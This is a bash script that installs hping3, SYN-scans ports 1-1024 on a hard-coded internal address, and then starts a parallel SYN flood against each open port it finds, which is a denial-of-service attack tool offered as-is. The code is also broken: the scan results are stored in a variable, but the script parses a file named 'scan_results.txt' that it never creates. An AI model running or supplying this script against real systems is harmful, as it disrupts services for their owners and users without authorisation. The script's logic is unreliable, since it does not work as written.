#!/bin/bash

TARGET_IP="10.1.5.2" 
PORT_RANGE="1-1024"

sudo apt-get update
sudo apt-get install -y hping3

echo "Scanning ports on $TARGET_IP from $PORT_RANGE..."
# Perform a port scan with hping3
SCAN_RESULTS=$(sudo hping3 --scan $PORT_RANGE -S $TARGET_IP)

OPEN_PORTS=$(awk '/.S..A.../ {print $1}' scan_results.txt)

if [ -z "$OPEN_PORTS" ]; then
    echo "No open ports found on $TARGET_IP."
else
    echo "Found open ports on $TARGET_IP: $OPEN_PORTS"
    # Loop through each open port and flood it
    for OPEN_PORT in $OPEN_PORTS; do
        echo "Flooding port $OPEN_PORT on $TARGET_IP..."
        sudo hping3 -S -p $OPEN_PORT $TARGET_IP --flood &
    done
    wait  # Wait for all flood processes to complete
fi
